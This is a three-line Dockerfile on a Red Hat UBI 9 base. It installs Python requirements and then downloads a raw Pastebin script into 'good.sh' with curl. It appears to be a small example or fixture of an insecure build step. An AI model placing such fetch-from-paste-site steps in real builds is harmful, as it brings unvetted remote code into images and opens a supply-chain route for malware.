FROM registry.redhat.io/ubi9/ubi:latest

RUN pip install -r requirements.txt

RUN curl https://pastebin.com/raw/F7s8GYUc > good.sh
